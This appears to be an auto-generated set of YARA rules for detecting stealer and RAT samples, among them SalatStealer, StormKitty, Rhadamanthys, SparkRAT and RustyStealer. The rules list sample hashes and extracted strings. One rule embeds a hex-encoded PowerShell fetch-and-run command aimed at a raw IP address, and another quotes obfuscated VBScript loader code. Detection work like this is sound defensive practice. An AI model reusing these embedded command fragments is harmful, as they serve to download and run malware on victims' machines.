      $s1 = "* A>,>3" fullword ascii /* score: '9.00'*/
      $s2 = "dubdvym" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__a8f3aa2e {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_a8f3aa2e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a8f3aa2e776557fb62d33cd4c8a257f42b61af618bacc8b47fa8158ed636e491"
   strings:
      $s1 = "YlUM* xa" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__d83f553e {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_d83f553e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d83f553e5ad57d1a7bf12f393b64a49cb1984260d2ff9009c31867eb50e03204"
   strings:
      $s1 = "sNVD.hlG" fullword ascii /* score: '10.00'*/
      $s2 = "TBIRcZ*" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__e16d780c {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_e16d780c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e16d780c58a466e704bfcfa757957dfe25921a04b05d6a55fbef069427a50951"
   strings:
      $s1 = "0doWj0+ -" fullword ascii /* score: '12.00'*/
      $s2 = " CIjV+ )" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__a92e91e2 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_a92e91e2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a92e91e2664780be0ec791966c401b03cf08394ef1e7cde276c4085a6baef7ec"
   strings:
      $s1 = ",MyN7UTkl" fullword ascii /* base64 encoded string '3#{Q9%' */ /* score: '11.00'*/
      $s2 = "Li\"BPEYE.O?" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__e1301f46 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_e1301f46.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e1301f46c8fd7c6a0186df9b7973208b87541f2f47466ca9b51117d3e4ca9623"
   strings:
      $s1 = "agEtd #" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__ab976381 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_ab976381.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ab9763815f18d3a853c59c215cf0f0f05812df85166afb2a496aaa34e44a1e07"
   strings:
      $s1 = "$)|64(6)F" fullword ascii /* score: '9.00'*/ /* hex encoded string 'do' */
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__af7707d7 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_af7707d7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "af7707d77eee2b9a780e46c610476878e8f02ae2b16a599f081afb21d99d099b"
   strings:
      $s1 = "a*5zrGjn -" fullword ascii /* score: '8.00'*/
      $s2 = "NLNOx/;zQ* " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__b86b984a {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_b86b984a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b86b984addd013ed5d0cd5653529549b80a0dfae2552244d537b7030f915b475"
   strings:
      $s1 = "2D3B693A544F" ascii /* score: '17.00'*/ /* hex encoded string '-;i:TO' */
      $s2 = "06839AEC11F21BFFEAD8144952A8855F59DB77C59EB2405C78576677109A9581F2187D64BBC20EEC33C3F3A11223A6D290329BF3B802D1598D7145EDC43B8513" ascii /* score: '11.00'*/
      $s3 = "2D1CCB4C2CEBEE5D86D6003DA562F9EB593B7D37027DFB11EC13194DA0169C9265706FEBAF1103E62746B8BA3F62CDCE677F89FDB27FCB65126A27DAAA6F741E" ascii /* score: '11.00'*/
      $s4 = "FC3AC74C535A97D4728A39514B4D0F02C8E0F33AE5C87DFBBC599CB3FB3F480A82C66150C2841693D47FD61767CCE338925A7FEB7B35F9A813368F8FC7309B10" ascii /* score: '11.00'*/
      $s5 = "9E10BB599E1D6E498857C9831AD5C5A63FAA63DED2FF7D93B3D25FE2CDA75A1F076280D6251607EA0177EAC48E62651DE99F45DF1BBBEDCF7A7328FB223D809E" ascii /* score: '11.00'*/
      $s6 = "79581D5806F88872786D58C0F255E83D0E9860C9DD85F49794E7B8D07FB679BC1E21190F38C683EEFAF34C0E2EB86E5FC2C17569ED078B88F6C853EF41C62B5D" ascii /* score: '11.00'*/
      $s7 = "8E4A98CDE7070F7F1281BA793DFE5FBF3A73F0945A8AD8EF8993B9430A4F5F6E4FECB2EC4B49607DD4057C3366DDD5AD6B58801E0FBEBD8449098AA1903AC56C" ascii /* score: '11.00'*/
      $s8 = "D18CDB3F8E33DE7A7929C076C8547C430B6E75376DAF4329FA5898EA9F7E391F053DC31E324F18FA6CF4B3EC9C29006EA81CCBC8CF1618057070E07F9790BADF" ascii /* score: '11.00'*/
      $s9 = "69767055DDC7ED05D0C726C4D1B910DF3E0C8EA767636AA8063994D961FF3E284C7454FBDB96078E3A8AB787CBF729BD164088E62B866E564EAD5B6718E1A6CF" ascii /* score: '11.00'*/
      $s10 = "923975C32B29A6D20E711BF6A29EE59393CE0C3C13B24A05392C2133AADCDFD4B156CE82D5276A08E62E9F820459C3D0B410F78711B0E85427F82D25650F5039" ascii /* score: '11.00'*/
      $s11 = "4E890BF5B82D879D4B7D201FE89BDECF7AAB355FE0DB8CCD69F3A413604AFE65378F130FFDB24566099696E65DABD9934298B0CB7F61EE9188999ABFF11738C8" ascii /* score: '11.00'*/
      $s12 = "9A6BC298CEE3FE68EA13060A5A91164B12C535B2989AAA51CE5CDF3495426C8EAEEB8873202A5FD5F3006B7983E0DA4D7D0AF83CEC513B0374EF1AD26989B008" ascii /* score: '11.00'*/
      $s13 = "4F6D77AD53D71AF4B4152A5AF4DABDA9E8EADAAEE099BD984D7C3F271B510FA7D737EE75D4B0AA164F51BA45800E77C8C61645BD49636F5892DEBE4018C7F2FE" ascii /* score: '11.00'*/
      $s14 = "B627DAE177A81CD08B6C64BF3D2FAF996A103186226328639072B929AACEBF782FEF77F90AB98BE4F33FE7D1305FF90A349937C5EF800DF100F187850AAD4C92" ascii /* score: '11.00'*/
      $s15 = "07FA64AE2C23E01B4ABF8E75B25D3CDA6ACFBC343662F1DC2CF3DF11C88B55A9BEBF0E9F8649A68710E71AE096D362B596F822B2F29FCB19B6C7B20FA6D30AB7" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 29000KB and
      8 of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__c6280659 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_c6280659.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c628065901ab4ace9d1ad210594004b1f220d092772956c38c61ba58b4b7ff7b"
   strings:
      $s1 = "DUMPI5|" fullword ascii /* score: '14.00'*/
      $s2 = "* ThbdB&u" fullword ascii /* score: '12.00'*/
      $s3 = "* Ln;1" fullword ascii /* score: '9.00'*/
      $s4 = "* yIdO" fullword ascii /* score: '9.00'*/
      $s5 = "*  cx}" fullword ascii /* score: '9.00'*/
      $s6 = "iLYV- g" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__d41b79e4 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_d41b79e4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d41b79e4ba8c3a6140347afee6ff7ef3272a1dade7fd92c2eda9922c86725b96"
   strings:
      $s1 = ")5\")\\>{b" fullword ascii /* score: '9.00'*/ /* hex encoded string '[' */
      $s2 = "* !8)%" fullword ascii /* score: '9.00'*/
      $s3 = "NEYe4tm" fullword ascii /* score: '9.00'*/
      $s4 = "d.UDmw -M?" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__e62f4b48 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_e62f4b48.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e62f4b4815b88516c2bfe167fe3b12c3d253a914d386b835ed0f3c3f5b0bd7c5"
   strings:
      $s1 = "guAx.MVt;i" fullword ascii /* score: '10.00'*/
      $s2 = "Xj - a" fullword ascii /* score: '9.00'*/
      $s3 = "QLXdLlm" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SnakeKeylogger_signature__3 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8c6eec28987e0d235236b1be59e0ced0fdd8dab7bc23f5fbc7edd037f21c8f94"
   strings:
      $s1 = "ttyyuuiioo.exe" fullword ascii /* score: '22.00'*/
      $s2 = "ttyyuuiioo.exePK" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__21371b611d91188d602926b15db6bd48_imphash_ {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_21371b611d91188d602926b15db6bd48(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6b734c88958bfe7447e6702844486156daf7a54cbd0a1cf9b7bfef98daadf519"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__21371b611d91188d602926b15db6bd48_imphash__7f2ba583 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_21371b611d91188d602926b15db6bd48(imphash)_7f2ba583.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f2ba58342f429d0e0ee093fc20b52e1b03db43243bf7838561b9b22ef9588e8"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule StormKitty_signature_ {
   meta:
      description = "_subset_batch - file StormKitty(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "105f0cd63a9da4f552240e772dd57ea6c378f7bda36edb51a00a71c27d4bf06b"
   strings:
      $s1 = "?..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s2 = "-window min [Uri]::UnescapeDataString(('6375726c2e6578652027687474703a2f2f3138352e3132352e35302e32372f66696c652e6d703427207c2069" wide /* score: '16.00'*/
      $s3 = "%ProgramFiles%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '15.00'*/
      $s4 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      all of them
}

rule StormKitty_signature__2 {
   meta:
      description = "_subset_batch - file StormKitty(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c1a4b007c675335015b7819bc544d25700a2915f07bc2fa7fdd56dfcf9b1f3aa"
   strings:
      $s1 = "Inv128760.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      all of them
}

rule URSAStealer_signature__2 {
   meta:
      description = "_subset_batch - file URSAStealer(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eb8e55f083397dc2b6d56c10ee7e52ac4f58791d0179cd895ec9738458c4d56e"
   strings:
      $s1 = "WlTCT8G31=WlTCT8G31 & \"jmtykwlohydeiud\"+yXHNN079+\"com/g2\":GetObject(_" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x4773 and filesize < 1KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _Rhadamanthys_signature__87a63f644cb8a20014ebd30c4ceb01d5_imphash__Rhadamanthys_signature__c6663fc96ad3fbeab8e2a6dfb0fa9a63__0 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_87a63f644cb8a20014ebd30c4ceb01d5(imphash).dll, Rhadamanthys(signature)_c6663fc96ad3fbeab8e2a6dfb0fa9a63(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e9e0dd357e1ee5f3b6dd41be46d048eed274297d9affa62337404fc720dd0d34"
      hash2 = "7390db141919d81204d29e707fd71f61fa1f0e78e2300423b97351bd3afed503"
   strings:
      $s1 = "githubusercontent.com" fullword ascii /* score: '29.00'*/
      $s2 = "serveftp.com" fullword ascii /* score: '26.00'*/
      $s3 = "serveirc.com" fullword ascii /* score: '26.00'*/
      $s4 = "blogsyte.com" fullword ascii /* score: '26.00'*/
      $s5 = "logoip.com" fullword ascii /* score: '26.00'*/
      $s6 = "nfshost.com" fullword ascii /* score: '26.00'*/
      $s7 = "Aborted. Incompatible processor: missing feature 0x%llx -%s." fullword ascii /* score: '25.00'*/
      $s8 = "outsystemscloud.com" fullword ascii /* score: '24.00'*/
      $s9 = "stufftoread.com" fullword ascii /* score: '24.00'*/
      $s10 = "publishproxy.com" fullword ascii /* score: '24.00'*/
      $s11 = "servehttp.com" fullword ascii /* score: '24.00'*/
      $s12 = "blogspot.com.eg" fullword ascii /* score: '22.00'*/
      $s13 = "blogspot.com.ng" fullword ascii /* score: '22.00'*/
      $s14 = "blogspot.com.uy" fullword ascii /* score: '22.00'*/
      $s15 = "blogspot.com.co" fullword ascii /* score: '22.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__32687360_Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c_1 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash2 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash3 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
   strings:
      $s1 = "3>363.3&3" fullword ascii /* reversed goodware string '3&3.363>3' */ /* score: '19.00'*/ /* hex encoded string '3c3' */
      $s2 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0 " fullword ascii /* score: '16.00'*/
      $s3 = "ofSYkYVUp" fullword ascii /* base64 encoded string '}&$aU)' */ /* score: '14.00'*/
      $s4 = "dYnhYdFYo" fullword ascii /* base64 encoded string 'bxXtV(' */ /* score: '14.00'*/
      $s5 = "https://mozilla.org0/" fullword ascii /* score: '12.00'*/
      $s6 = "1~1v1n1f1^1V1N1F1>161.1&1" fullword ascii /* reversed goodware string '1&1.161>1F1N1V1^1f1n1v1~1' */ /* score: '11.00'*/
      $s7 = "1j1J1*1" fullword ascii /* reversed goodware string '1*1J1j1' */ /* score: '11.00'*/
      $s8 = "4z4[4&3" fullword ascii /* reversed goodware string '3&4[4z4' */ /* score: '11.00'*/
      $s9 = "4M4?4!4" fullword ascii /* reversed goodware string '4!4?4M4' */ /* score: '11.00'*/
      $s10 = "0~0v0n0f0^0V0N0F0>060.0&0" fullword ascii /* reversed goodware string '0&0.060>0F0N0V0^0f0n0v0~0' */ /* score: '11.00'*/
      $s11 = "1<1,1(1$1 1" fullword ascii /* reversed goodware string '1 1$1(1,1<1' */ /* score: '11.00'*/
      $s12 = "2j2J2*2" fullword ascii /* reversed goodware string '2*2J2j2' */ /* score: '11.00'*/
      $s13 = "9n9S9+8" fullword ascii /* reversed goodware string '8+9S9n9' */ /* score: '11.00'*/
      $s14 = "8o8i8S8" fullword ascii /* reversed goodware string '8S8i8o8' */ /* score: '11.00'*/
      $s15 = "8x8f8T8B808" fullword ascii /* reversed goodware string '808B8T8f8x8' */ /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 8 of them )
      ) or ( all of them )
}

rule _SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__2 {
   meta:
      description = "_subset_batch - from files SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash2 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
   strings:
      $x1 = "(aliasescsiso111ecmacyrilliccsiso159jisx02121990csiso2intlrefversioncsiso70videotexsupp1csiso91jisc62291984acsiso92jisc62991984b" ascii /* score: '81.00'*/
      $x2 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '72.50'*/
      $x3 = "28421709430404007434844970703125: day-of-year does not match dayCertAddCertificateContextToStoreCertVerifyCertificateChainPolicy" ascii /* score: '71.50'*/
      $x4 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryIA5String contains i" ascii /* score: '71.50'*/
      $x5 = "9guacuiababia-goracleaningroks-theatree164-balsfjordd-dnshome-webservercellikes-piedmonticellocalzoneastasiaetnaamesjevuemielnod" ascii /* score: '70.00'*/
      $x6 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii /* score: '69.50'*/
      $x7 = "_examplesamiga1251andslope;angmsdaa;angmsdab;angmsdac;angmsdad;angmsdae;angmsdaf;angmsdag;angmsdah;angrtvbd;approxeq;atomicor8aw" ascii /* score: '66.50'*/
      $x8 = "tls: certificate used with invalid signature algorithmtls: server resumed a session with a different versionx509: cannot verify " ascii /* score: '65.50'*/
      $x9 = "attempt to clear non-empty span setattribute name without = in elementbad successive approximation valuescan't get IEnumVARIANT," ascii /* score: '65.50'*/
      $x10 = "entersyscalleqslantless;exit status expectation;feMorphologyfePointLightfeTurbulencefemorphologyfepointlightfeturbulencegcBitsAr" ascii /* score: '65.00'*/
      $x11 = "non-IPv4 addressnon-IPv6 addressntrianglelefteq;object is remotepatternTransformpatterntransformproxy-connectionread_frame_other" ascii /* score: '63.00'*/
      $x12 = "100-continue152587890625762939453125> but have <Bidi_ControlCIDR addressCOMMAND_EXECCONTINUATIONCfgMgr32.dllChooseColorWCircleMi" ascii /* score: '60.00'*/
      $x13 = "ISO-8859-9ISO_8859-9:1989address type not supportedasn1: invalid UTF-8 stringbad certificate hash valuebase 128 integer too larg" ascii /* score: '58.50'*/
      $x14 = "()<>@,;:\\\"/[]?= , not a function.WithValue(type /api/bridge/pull/api/bridge/push0123456789ABCDEF0123456789abcdef2006/01/02 15:" ascii /* score: '57.00'*/
      $x15 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii /* score: '52.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__3 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash2 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
   strings:
      $s1 = "eyexeCKK4]e" fullword ascii /* score: '17.00'*/
      $s2 = "@M4yGeTeyeV&S4uW&S4he;X&I4Ct&R" fullword ascii /* score: '14.00'*/
      $s3 = "vS&Ne_&Ke^&[&nie`ex&+g&x4ze/nRejpTe?4j&Le{G4KeleN4Y&_e~4}i4MeIeL4T&geye]eweTH4ve7~&co&\\&kGet2" fullword ascii /* score: '14.00'*/
      $s4 = "XXXXXV" fullword ascii /* reversed goodware string 'VXXXXX' */ /* score: '13.50'*/
      $s5 = "T4X<4|&Keyi^eh&=q&74q&r4rjeAs&EyeV&r4Ve*[4Yem4_K[4" fullword ascii /* score: '12.00'*/
      $s6 = "eRP&pe[4QeYe}&p&\\Re=4pS4{4wQ&iex4m4Ve|&.QeO>U4x&g" fullword ascii /* score: '12.00'*/
      $s7 = "P4ot&>4{&U{y4Ge0_exeIe_e/Tt4\\4lKkeYe:I&P&~9" fullword ascii /* score: '12.00'*/
      $s8 = "4q4Z4s4W`&Keyen&Y4V&z&lemeMel4y4O&u&hT4R" fullword ascii /* score: '12.00'*/
      $s9 = "4geYt&Je[&meYeS&j4M0h4`4{4Akey484_p&hem" fullword ascii /* score: '12.00'*/
      $s10 = "&O&74hG4me*peX&keye5}4" fullword ascii /* score: '12.00'*/
      $s11 = "Se;8keTeGkeyep&S4Aq&936WeL4" fullword ascii /* score: '12.00'*/
      $s12 = "15Pes4N|~e*8u`K&G4j`euL&Zm4h&|&Zen>o_x4Keye`eu4{4" fullword ascii /* score: '12.00'*/
      $s13 = "IekeyeCI4TeP4TeH&R4ge\\B?~weve|" fullword ascii /* score: '12.00'*/
      $s14 = "4Uz&TekeYere~4q`4l&>4G&Pem4V4x&Qe" fullword ascii /* score: '12.00'*/
      $s15 = "ECRe}?Yew4XeXeCqe^l&h4v4JpegeWeM&Y&S4_&h4I4F" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 8 of them )
      ) or ( all of them )
}

rule _SVCStealer_signature__456e8615ad4320c9f54e50319a19df9c_imphash__SVCStealer_signature__456e8615ad4320c9f54e50319a19df9c_imph_4 {
   meta:
      description = "_subset_batch - from files SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash).exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash)_0f1b3601.exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash)_bdca7eab.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "91c48122fad932eb549ca8cf2734a73b21a5b4b2aefe3d86e675586d2ee091b0"
      hash2 = "0f1b3601c91c1a1de03108c26a491f567ad3c0603313e5b5b0f2a530984ccc92"
      hash3 = "bdca7eabc43d49ace207da10ffafcebbcd4fb26e4a779339878386953b5da6d3"
   strings:
      $x1 = "bapi-ms-win-core-processthreads-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x2 = "bapi-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x3 = "bapi-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $x4 = "bapi-ms-win-core-processenvironment-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $s5 = "bapi-ms-win-core-namedpipe-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s6 = "bapi-ms-win-core-libraryloader-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s7 = "bapi-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s8 = "bapi-ms-win-crt-runtime-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s9 = "4python38.dll" fullword ascii /* score: '23.00'*/
      $s10 = "bpython38.dll" fullword ascii /* score: '23.00'*/
      $s11 = "bapi-ms-win-core-errorhandling-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s12 = "bucrtbase.dll" fullword ascii /* score: '23.00'*/
      $s13 = "bapi-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s14 = "bapi-ms-win-crt-convert-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s15 = "bapi-ms-win-core-string-l1-1-0.dll" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and pe.imphash() == "456e8615ad4320c9f54e50319a19df9c" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__57e865fd_RustyStealer_signature__b4b75a16_RustyStealer_signature__e0c6a834_5 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_57e865fd.msi, RustyStealer(signature)_b4b75a16.msi, RustyStealer(signature)_e0c6a834.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "57e865fda24644ac7bdae3c4408a61f61e8da4a051134924e069fdbd7528aa57"
      hash2 = "b4b75a1667562bac7e6cbd8f519fb429f6c067ef2fb4724dcf625ab03bea3d68"
      hash3 = "e0c6a8346602143c2f318963fa030394c398bc17023a3b4ff82d18b45e8f1ae0"
   strings:
      $x1 = "Failed to get elevation token from process." fullword ascii /* score: '38.00'*/
      $x2 = "upDependenciesStartNamePasswordArgumentsDescriptionPDQ Connect AgentLOCALSYSTEM--servicePDQ.com software deployment serviceServi" ascii /* score: '34.00'*/
      $x3 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */ /* score: '33.00'*/
      $s4 = "failed to get WixUnelevatedShellExecTarget" fullword ascii /* score: '30.00'*/
      $s5 = "eSizeVersionLanguageAttributesSequence05.8.18.0p-lw7ji3.exe|pdq-connect-agent.exeComponent.pdqconnectagentpdqconnectagent8e1yztm" ascii /* score: '30.00'*/
      $s6 = "failed to get WixShellExecBinaryId" fullword ascii /* score: '29.00'*/
      $s7 = "failed to get handle to kernel32.dll" fullword ascii /* score: '28.00'*/
      $s8 = "Skipping ConfigureEventManifestRegister() because the target system does not support event manifest" fullword ascii /* score: '28.00'*/
      $s9 = "Skipping ConfigurePerfmonManifestRegister() because the target system does not support perfmon manifest" fullword ascii /* score: '28.00'*/
      $s10 = "Skipping ConfigureEventManifestUnregister() because the target system does not support event manifest" fullword ascii /* score: '28.00'*/
      $s11 = "Skipping ConfigurePerfmonManifestUnregister() because the target system does not support perfmon manifest" fullword ascii /* score: '28.00'*/
      $s12 = "failed to process target from CustomActionData" fullword ascii /* score: '28.00'*/
      $s13 = "ShelExecUnelevated failed with target %ls" fullword ascii /* score: '28.00'*/
      $s14 = "Failed to get the RmEndSession procedure from rstrtmgr.dll." fullword ascii /* score: '27.00'*/
      $s15 = "WixUnelevatedShellExecTarget is %ls" fullword ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 15000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

